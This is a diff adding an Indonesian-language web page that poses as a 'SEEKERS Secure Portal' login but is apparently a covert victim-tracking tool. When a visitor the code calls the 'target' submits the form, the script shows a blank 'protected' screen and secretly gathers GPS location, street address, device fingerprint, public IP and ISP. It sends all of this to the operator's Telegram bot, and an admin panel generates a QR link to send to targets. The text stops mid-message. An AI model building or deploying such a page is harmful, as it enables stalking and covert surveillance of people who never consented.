@@ -1,0 +1,1144 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🔐 SEEKERS • SECURE PORTAL</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', 'Segoe UI', system-ui, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0b0e, #1a1d26);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        /* LOGIN CONTAINER */
+        .login-container {
+            max-width: 400px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            border-radius: 40px;
+            padding: 30px 25px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(0, 255, 255, 0.1), transparent);
+            transform: rotate(45deg);
+            animation: scan 4s infinite;
+        }
+
+        @keyframes scan {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .login-header h1 {
+            font-size: 2.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00f7ff, #ff00e6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 5px;
+        }
+
+        .login-header p {
+            color: #aaa;
+            font-size: 0.9rem;
+        }
+
+        .login-header p i {
+            color: #00f7ff;
+            margin-right: 5px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .input-group label {
+            display: block;
+            color: #fff;
+            margin-bottom: 8px;
+            font-weight: 500;
+            font-size: 0.95rem;
+        }
+
+        .input-group label i {
+            color: #00f7ff;
+            margin-right: 8px;
+            width: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px 20px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            border-radius: 30px;
+            color: #fff;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #00f7ff;
+            box-shadow: 0 0 20px rgba(0, 247, 255, 0.3);
+        }
+
+        .input-group input::placeholder {
+            color: #666;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #00f7ff, #0088cc);
+            border: none;
+            border-radius: 50px;
+            color: #000;
+            font-weight: 700;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            position: relative;
+            z-index: 2;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            box-shadow: 0 10px 30px rgba(0, 247, 255, 0.3);
+        }
+
+        .login-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 20px 40px rgba(0, 247, 255, 0.5);
+        }
+
+        .login-footer {
+            text-align: center;
+            margin-top: 25px;
+            color: #666;
+            font-size: 0.8rem;
+            position: relative;
+            z-index: 2;
+        }
+
+        .login-footer span {
+            color: #00f7ff;
+        }
+
+        /* MAIN CONTAINER (HIDE AWAL) */
+        .main-container {
+            max-width: 800px;
+            width: 100%;
+            margin: 0 auto;
+            display: none;
+            position: relative;
+            z-index: 10;
+        }
+
+        /* Animated Background */
+        .glow {
+            position: fixed;
+            width: 300px;
+            height: 300px;
+            background: rgba(0, 255, 255, 0.15);
+            filter: blur(80px);
+            border-radius: 50%;
+            top: -100px;
+            right: -100px;
+            z-index: 0;
+            animation: float 10s infinite alternate;
+        }
+
+        .glow2 {
+            position: fixed;
+            width: 400px;
+            height: 400px;
+            background: rgba(255, 0, 255, 0.1);
+            filter: blur(100px);
+            border-radius: 50%;
+            bottom: -150px;
+            left: -150px;
+            z-index: 0;
+            animation: float2 12s infinite alternate;
+        }
+
+        @keyframes float {
+            0% { transform: translate(0, 0) scale(1); opacity: 0.3; }
+            100% { transform: translate(50px, 50px) scale(1.2); opacity: 0.6; }
+        }
+
+        @keyframes float2 {
+            0% { transform: translate(0, 0) scale(1); opacity: 0.2; }
+            100% { transform: translate(-30px, -30px) scale(1.3); opacity: 0.5; }
+        }
+
+        /* HEADER PREMIUM */
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .header h1 {
+            font-size: 3.2rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, #00f7ff, #ff00e6, #ffaa00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: 2px;
+            text-shadow: 0 0 30px rgba(0, 247, 255, 0.5);
+            animation: titleGlow 2s infinite alternate;
+        }
+
+        @keyframes titleGlow {
+            0% { filter: drop-shadow(0 0 10px #00f7ff); }
+            100% { filter: drop-shadow(0 0 20px #ff00e6); }
+        }
+
+        .badge-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 8px;
+        }
+
+        .badge {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(0, 255, 255, 0.4);
+            color: #00f7ff;
+            padding: 5px 15px;
+            border-radius: 50px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);
+        }
+
+        .badge i {
+            margin-right: 5px;
+            color: gold;
+        }
+
+        /* ADMIN BADGE */
+        .admin-badge {
+            background: linear-gradient(135deg, #ffaa00, #ff5500);
+            color: #000;
+            font-weight: 800;
+            padding: 10px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            margin-bottom: 15px;
+            border: 2px solid #fff;
+        }
+
+        /* BLANK SCREEN UNTUK TARGET */
+        .blank-screen {
+            background: #000;
+            min-height: 100vh;
+            width: 100%;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #333;
+            font-family: monospace;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 9999;
+        }
+
+        .blank-screen .dots {
+            font-size: 2rem;
+            letter-spacing: 5px;
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 0.2; }
+            50% { opacity: 1; }
+            100% { opacity: 0.2; }
+        }
+
+        /* QR CARD */
+        .qr-card {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            border-radius: 30px;
+            padding: 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .qr-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(0, 255, 255, 0.1), transparent);
+            transform: rotate(45deg);
+            animation: scan 4s infinite;
+        }
+
+        .qr-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .qr-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .qr-title i {
+            font-size: 2rem;
+            color: #00f7ff;
+            filter: drop-shadow(0 0 10px #00f7ff);
+        }
+
+        .qr-title span {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .qr-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 15px;
+            position: relative;
+            z-index: 2;
+        }
+
+        #qrcode {
+            background: white;
+            padding: 15px;
+            border-radius: 25px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            border: 3px solid #00f7ff;
+        }
+
+        /* GRID SYSTEM */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        /* PREMIUM CARDS */
+        .card {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            border-radius: 25px;
+            padding: 18px;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            border-color: #00f7ff;
+            box-shadow: 0 20px 40px rgba(0, 247, 255, 0.3);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .card-header i {
+            font-size: 1.6rem;
+            color: #00f7ff;
+            filter: drop-shadow(0 0 10px #00f7ff);
+        }
+
+        .card-header h3 {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .card-content {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .info-row {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            flex-wrap: wrap;
+            padding: 4px 0;
+            border-bottom: 1px dashed rgba(255, 255, 255, 0.05);
+        }
+
+        .info-label {
+            min-width: 80px;
+            color: #aaa;
+            font-size: 0.9rem;
+            font-weight: 400;
+        }
+
+        .info-value {
+            color: #fff;
+            font-weight: 500;
+            word-break: break-word;
+            flex: 1;
+            font-size: 0.95rem;
+        }
+
+        .info-value.highlight {
+            color: #00f7ff;
+            font-weight: 600;
+        }
+
+        /* MAPS LINKS */
+        .maps-container {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 12px;
+        }
+
+        .map-link {
+            background: rgba(0, 0, 0, 0.5);
+            color: #fff;
+            padding: 6px 14px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-size: 0.8rem;
+            border: 1px solid rgba(0, 247, 255, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            transition: all 0.3s;
+            flex: 1;
+            justify-content: center;
+        }
+
+        .map-link:hover {
+            background: #00f7ff;
+            color: #000;
+            border-color: #00f7ff;
+            transform: scale(1.05);
+        }
+
+        /* BATTERY BAR */
+        .battery-bar {
+            width: 100%;
+            height: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .battery-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff88, #00f7ff);
+            border-radius: 20px;
+            width: 0%;
+            transition: width 0.5s;
+            box-shadow: 0 0 20px #00ff88;
+        }
+
+        .battery-level {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 4px;
+            color: #00ff88;
+            font-weight: 600;
+        }
+
+        /* CONNECTION ID */
+        .id-badge {
+            font-family: monospace;
+            background: rgba(0, 247, 255, 0.1);
+            border: 1px solid #00f7ff;
+            padding: 8px 12px;
+            border-radius: 15px;
+            color: #00f7ff;
+            font-size: 1rem;
+            letter-spacing: 1px;
+            text-align: center;
+            margin: 5px 0;
+        }
+
+        /* FOOTER */
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            border: 1px solid rgba(0, 247, 255, 0.2);
+        }
+
+        .footer-logo {
+            font-size: 1.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00f7ff, #ff00e6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 8px;
+        }
+
+        .footer-copy {
+            color: #666;
+            font-size: 0.7rem;
+        }
+
+        .watermark {
+            color: rgba(0, 247, 255, 0.2);
+            font-size: 0.7rem;
+            margin-top: 5px;
+        }
+
+        /* LOADING */
+        .loading {
+            color: #00f7ff;
+            font-style: italic;
+            animation: blink 1.5s infinite;
+        }
+    </style>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- QR Code Library -->
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+</head>
+<body>
+    <!-- Animated Background -->
+    <div class="glow"></div>
+    <div class="glow2"></div>
+
+    <!-- LOGIN FORM -->
+    <div class="login-container" id="loginForm">
+        <div class="login-header">
+            <h1>🔐 SEEKERS</h1>
+            <p><i class="fas fa-shield-alt"></i> SECURE PORTAL ACCESS</p>
+        </div>
+        
+        <div class="input-group">
+            <label><i class="fas fa-user"></i> USERNAME</label>
+            <input type="text" id="username" placeholder="Masukkan username..." autocomplete="off">
+        </div>
+        
+        <div class="input-group">
+            <label><i class="fas fa-lock"></i> PASSWORD</label>
+            <input type="password" id="password" placeholder="Masukkan password..." autocomplete="off">
+        </div>
+        
+        <button class="login-btn" onclick="handleLogin()">
+            <i class="fas fa-sign-in-alt"></i> MASUK
+        </button>
+        
+        <div class="login-footer">
+            <span>✦</span> PREMIUM PORTAL <span>✦</span>
+        </div>
+    </div>
+
+    <!-- BLANK SCREEN UNTUK TARGET (USER BIASA) -->
+    <div class="blank-screen" id="blankScreen">
+        <div style="color:#0f0; font-size:0.8rem; margin-bottom:20px;">_</div>
+        <div class="dots">. . .</div>
+        <div style="color:#0f0; font-size:0.8rem; margin-top:20px;">[SYSTEM PROTECTED]</div>
+    </div>
+
+    <!-- MAIN CONTAINER UNTUK ADMIN -->
+    <div class="main-container" id="mainContainer">
+        <!-- HEADER -->
+        <div class="header">
+            <h1>🔥 SEEKERS</h1>
+            <div class="badge-container">
+                <span class="badge"><i class="fas fa-crown"></i> ADMIN MODE</span>
+                <span class="badge"><i class="fas fa-map-pin"></i> REAL-TIME GPS</span>
+                <span class="badge"><i class="fas fa-bolt"></i> LIVE TRACKING</span>
+            </div>
+            <div class="admin-badge">
+                <i class="fas fa-shield-alt"></i> WELCOME ADMIN
+            </div>
+        </div>
+
+        <!-- QR CARD -->
+        <div class="qr-card">
+            <div class="qr-header">
+                <div class="qr-title">
+                    <i class="fas fa-qrcode"></i>
+                    <span>ACCESS QR</span>
+                </div>
+                <div class="qr-badge" style="color:#00f7ff;">
+                    <i class="fas fa-sync-alt"></i> TARGET LINK
+                </div>
+            </div>
+            <div class="qr-wrapper">
+                <div id="qrcode"></div>
+                <div class="qr-note" style="color:#aaa;">
+                    <i class="fas fa-camera"></i> Scan untuk kirim ke target
+                </div>
+            </div>
+        </div>
+
+        <!-- LOKASI & NAVIGASI -->
+        <div class="grid">
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-map-pin"></i>
+                    <h3>📍 LOKASI TARGET</h3>
+                </div>
+                <div class="card-content">
+                    <div class="info-row">
+                        <span class="info-label">Koordinat:</span>
+                        <span class="info-value highlight" id="coordinates">Menunggu target...</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Akurasi:</span>
+                        <span class="info-value" id="accuracy">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Jalan:</span>
+                        <span class="info-value" id="street">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Desa/Kel:</span>
+                        <span class="info-value" id="village">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Kecamatan:</span>
+                        <span class="info-value" id="district">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Kota:</span>
+                        <span class="info-value" id="city">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Provinsi:</span>
+                        <span class="info-value" id="state">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Negara:</span>
+                        <span class="info-value" id="country">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Kodepos:</span>
+                        <span class="info-value" id="postcode">-</span>
+                    </div>
+                    
+                    <!-- MAPS LINKS -->
+                    <div class="maps-container" id="mapsLinks">
+                        <span class="loading">Menunggu lokasi target...</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SPESIFIKASI TARGET -->
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-laptop"></i>
+                    <h3>💻 SPESIFIKASI TARGET</h3>
+                </div>
+                <div class="card-content">
+                    <div class="info-row">
+                        <span class="info-label">OS:</span>
+                        <span class="info-value" id="os">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Browser:</span>
+                        <span class="info-value" id="browser">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">CPU:</span>
+                        <span class="info-value" id="cpu">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">RAM:</span>
+                        <span class="info-value" id="ram">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Layar:</span>
+                        <span class="info-value" id="screen">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Bahasa:</span>
+                        <span class="info-value" id="language">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Timezone:</span>
+                        <span class="info-value" id="timezone">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">GPU:</span>
+                        <span class="info-value" id="gpu">-</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- BATERAI & IP TARGET -->
+        <div class="grid">
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-battery-three-quarters"></i>
+                    <h3>🔋 INFO BATERAI TARGET</h3>
+                </div>
+                <div class="card-content">
+                    <div class="battery-level">
+                        <span><i class="fas fa-bolt"></i> Level:</span>
+                        <span id="batteryLevel">-</span>
+                    </div>
+                    <div class="battery-bar">
+                        <div class="battery-fill" id="batteryFill" style="width:0%"></div>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Status:</span>
+                        <span class="info-value" id="batteryStatus">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Estimasi:</span>
+                        <span class="info-value" id="batteryTime">-</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-network-wired"></i>
+                    <h3>🌐 DATA IP TARGET</h3>
+                </div>
+                <div class="card-content">
+                    <div class="info-row">
+                        <span class="info-label">IP Publik:</span>
+                        <span class="info-value highlight" id="publicIP">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Lokasi IP:</span>
+                        <span class="info-value" id="ipLocation">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">ISP:</span>
+                        <span class="info-value" id="isp">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">ASN:</span>
+                        <span class="info-value" id="asn">-</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- KONEKSI & ID TARGET -->
+        <div class="grid">
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-wifi"></i>
+                    <h3>📶 KONEKSI TARGET</h3>
+                </div>
+                <div class="card-content">
+                    <div class="info-row">
+                        <span class="info-label">Tipe:</span>
+                        <span class="info-value" id="networkType">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Kecepatan:</span>
+                        <span class="info-value" id="networkSpeed">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">RTT:</span>
+                        <span class="info-value" id="rtt">-</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-fingerprint"></i>
+                    <h3>🆔 ID TARGET</h3>
+                </div>
+                <div class="card-content">
+                    <div class="id-badge" id="targetId">-</div>
+                    <div class="info-row">
+                        <span class="info-label">Waktu akses:</span>
+                        <span class="info-value" id="accessTime">-</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- FOOTER -->
+        <div class="footer">
+            <div class="footer-logo">
+                🔥 SEEKERS PREMIUM 🔥
+            </div>
+            <div style="color:#00f7ff; margin:10px 0;">
+                <i class="fas fa-check-circle"></i> DATA REAL-TIME
+                <i class="fas fa-check-circle" style="margin-left:15px;"></i> AUTO SYNC
+            </div>
+            <div class="footer-copy">
+                © 2026 • ADMIN PORTAL • DEEPXBZ
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ===========================================
+        // KONFIGURASI TELEGRAM - GANTI DENGAN PUNYA LO!
+        // ===========================================
+        const BOT_TOKEN = 'GANTI_DENGAN_TOKEN_BOT_LO';  // Dapat dari @BotFather
+        const CHAT_ID = 'GANTI_DENGAN_CHAT_ID_LO';      // ID chat admin (lo)
+        
+        // Password admin (sesuai request: pw1sampai1)
+        const ADMIN_PASS = 'pw1sampai1';
+
+        // ===========================================
+        // FUNGSI KIRIM KE TELEGRAM
+        // ===========================================
+        function kirimKeTelegram(pesan) {
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            let data = {
+                chat_id: CHAT_ID,
+                text: pesan,
+                parse_mode: 'HTML'
+            };
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Terikirim ke Telegram:', data);
+            })
+            .catch(error => {
+                console.log('Gagal kirim:', error);
+            });
+        }
+
+        // ===========================================
+        // FUNGSI LOGIN
+        // ===========================================
+        function handleLogin() {
+            let user = document.getElementById('username').value;
+            let pass = document.getElementById('password').value;
+            
+            if (pass === ADMIN_PASS) {
+                // ADMIN - tampilkan panel
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('mainContainer').style.display = 'block';
+                
+                // Kirim notif admin login ke Telegram
+                let waktu = new Date().toLocaleString('id-ID');
+                kirimKeTelegram(`🔐 ADMIN LOGIN\nWaktu: ${waktu}\nIP: ${window.location.href}`);
+                
+            } else {
+                // USER BIASA (TARGET) - blank screen
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('blankScreen').style.display = 'flex';
+                
+                // Kirim notif target login + langsung ambil data
+                kirimDataTarget();
+            }
+        }
+
+        // ===========================================
+        // FUNGSI AMBIL DATA TARGET
+        // ===========================================
+        function kirimDataTarget() {
+            // Generate ID target
+            let targetId = 'T' + Math.random().toString(36).substring(2, 10).toUpperCase() + Date.now().toString(36).toUpperCase();
+            let waktuAkses = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+            
+            // Tampilkan di panel (walau blank, data tetap dikirim)
+            document.getElementById('targetId').textContent = targetId;
+            document.getElementById('accessTime').textContent = waktuAkses;
+            
+            // Ambil data device
+            let os = navigator.userAgent.includes('Windows') ? 'Windows' : 
+                    navigator.userAgent.includes('Mac') ? 'macOS' :
+                    navigator.userAgent.includes('iPhone') ? 'iOS' :
+                    navigator.userAgent.includes('Android') ? 'Android' : 'Unknown';
+            
+            let browser = navigator.userAgent.includes('Chrome') ? 'Chrome' :
+                         navigator.userAgent.includes('Firefox') ? 'Firefox' :
+                         navigator.userAgent.includes('Safari') ? 'Safari' : 'Unknown';
+            
+            let cpu = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Core' : 'Unknown';
+            let ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
+            let layar = screen.width + 'x' + screen.height;
+            let bahasa = navigator.language;
+            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Asia/Jakarta';
+            
+            // Tampilkan di panel admin
+            document.getElementById('os').textContent = os;
+            document.getElementById('browser').textContent = browser;
+            document.getElementById('cpu').textContent = cpu;
+            document.getElementById('ram').textContent = ram;
+            document.getElementById('screen').textContent = layar;
+            document.getElementById('language').textContent = bahasa;
+            document.getElementById('timezone').textContent = timezone;
+            
+            // Ambil GPU
+            let canvas = document.createElement('canvas');
+            let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            let gpu = 'Unknown';
+            if (gl) {
+                let info = gl.getExtension('WEBGL_debug_renderer_info');
+                if (info) gpu = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
+            }
+            document.getElementById('gpu').textContent = gpu;
+            
+            // Ambil IP
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    document.getElementById('publicIP').textContent = data.ip || '-';
+                    document.getElementById('ipLocation').textContent = (data.city || '') + ', ' + (data.country_name || '');
+                    document.getElementById('isp').textContent = data.org || '-';
+                    document.getElementById('asn').textContent = data.asn ? 'AS' + data.asn : '-';
+                });
+            
+            // Ambil koneksi
+            let conn = navigator.connection || navigator.mozConnection;
+            if (conn) {
+                document.getElementById('networkType').textContent = (conn.effectiveType || '-').toUpperCase();
+                document.getElementById('networkSpeed').textContent = (conn.downlink || '?') + ' Mbps';
+                document.getElementById('rtt').textContent = (conn.rtt || '?') + ' ms';
+            }
+            
+            // Ambil lokasi GPS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async function(pos) {
+                        let lat = pos.coords.latitude;
+                        let lon = pos.coords.longitude;
+                        let acc = pos.coords.accuracy;
+                        
+                        document.getElementById('coordinates').textContent = lat.toFixed(6) + ', ' + lon.toFixed(6);
+                        document.getElementById('accuracy').textContent = '±' + Math.round(acc) + ' m';
+                        
+                        // Maps links
+                        document.getElementById('mapsLinks').innerHTML = `
+                            <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="map-link"><i class="fab fa-google"></i> Google</a>
+                            <a href="https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lon}" target="_blank" class="map-link"><i class="fas fa-street-view"></i> Street</a>
+                            <a href="https://waze.com/ul?ll=${lat},${lon}&navigate=yes" target="_blank" class="map-link"><i class="fab fa-waze"></i> Waze</a>
+                        `;
+                        
+                        // Reverse geocoding
+                        try {
+                            let res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`);
+                            let data = await res.json();
+                            let addr = data.address || {};
+                            
+                            document.getElementById('street').textContent = addr.road || '-';
+                            document.getElementById('village').textContent = addr.village || addr.suburb || '-';
+                            document.getElementById('district').textContent = addr.county || '-';
+                            document.getElementById('city').textContent = addr.city || addr.town || '-';
+                            document.getElementById('state').textContent = addr.state || '-';
+                            document.getElementById('country').textContent = addr.country || '-';
+                            document.getElementById('postcode').textContent = addr.postcode || '-';
+                            
+                        } catch (e) {}
+                        
+                        // Kirim semua data ke Telegram
+                        let pesan = `🔍 TARGET MASUK!
+━━━━━━━━━━━━━━━━━━━━━━━━━
+🆔 ID: ${targetId}
+⏰ Waktu: ${waktuAkses}
+
+📍 LOKASI GPS
+──────────────
+Koordinat: ${lat.toFixed(6)}, ${lon.toFixed(6)}
+Akurasi: ±${Math.round(acc)}m
+Jalan: ${document.getElementById('street').textContent}
+Desa: ${document.getElementById('village').textContent}
+Kec: ${document.getElementById('district').textContent}
+Kota: ${document.getElementById('city').textContent}
+Prov: ${document.getElementById('state').textContent}
+Negara: ${document.getElementById('country').textContent}
+Pos: ${document.getElementById('postcode').textContent}
+
+🗺️ LINK:
+Google: https://maps.google.com/?q=${lat},${lon}
+Street: https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lon}
+Waze: https://waze.com/ul?ll=${lat},${lon}&navigate=yes
+
+💻 DEVICE
+──────────────
+OS: ${os}
+Browser: ${browser}
+CPU: ${cpu}
+RAM: ${ram}
+Layar: ${layar}
+GPU: ${gpu}
+Bahasa: ${bahasa}
+Timezone: ${timezone}
+
+🌐 IP & KONEKSI
+──────────────
+IP: ${document.getElementById('publicIP').textContent}
+Lokasi IP: ${document.getElementById('ipLocation').textContent}
+ISP: ${document.getElementById('isp').textContent}
+Tipe: ${document.getElementById('networkType').textContent}
+Kecepatan: ${document.getElementById('networkSpeed').textContent}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━
+🔐 SEEKERS PREMIUM • ONE AXE`;
+                        
+                        kirimKeTelegram(pesan);
+                    },
+                    function(err) {
+                        // Kalo gagal dapet lokasi, tetap kirim data device
+                        let pesan = `🔍 TARGET MASUK (TANPA LOKASI)
+━━━━━━━━━━━━━━━━━━━━━━━━━
+🆔 ID: ${targetId}
+⏰ Waktu: ${waktuAkses}
+
+❌ GAGAL LOKASI: ${err.message}
+
+💻 DEVICE
+──────────────
+OS: ${os}
+Browser: ${browser}
+CPU: ${cpu}
+RAM: ${ram}
+Layar: ${layar}
+GPU: ${gpu}
+Bahasa: ${bahasa}
+Timezone: ${timezone}
+
+🌐 IP & KONEKSI
+──────────────
+IP: ${document.getElementById('publicIP').textContent}
+Lokasi IP: ${document.getElementById('ipLocation').textContent}
+ISP: ${document.getElementById('isp').textContent}
+Tipe: ${document.getElementById('networkType').textContent}
+Kecepatan: ${document.getElementById('networkSpeed').textContent}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━
+🔐 SEEKERS PREMIUM • ONE AXE`;
+                        
+                        kirimKeTelegram(pesan);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000
+                    }
+                );
+            } else {
+                // Kalo GPS nggak support
+                let pesan = `🔍 TARGET MASUK (NO GPS)
+━━━━━━━━━━━━━━━━━━━━━━━━━
+🆔 ID: ${targetId}
+⏰ Waktu: ${waktuAkses}
+
+❌ GPS TIDAK DIDUKUNG
+
+💻 DEVICE
+──────────────
+OS: ${os}
+Browser: ${browser}
+CPU: ${cpu}
+RAM: ${ram}
+Layar: ${layar}
+GPU: ${gpu}
+Bahasa: ${bahasa}
+Timezone: ${timezone}
+
+🌐 IP & KONEKSI
+──────────────
+IP: ${document.getElementById('publicIP').textContent}
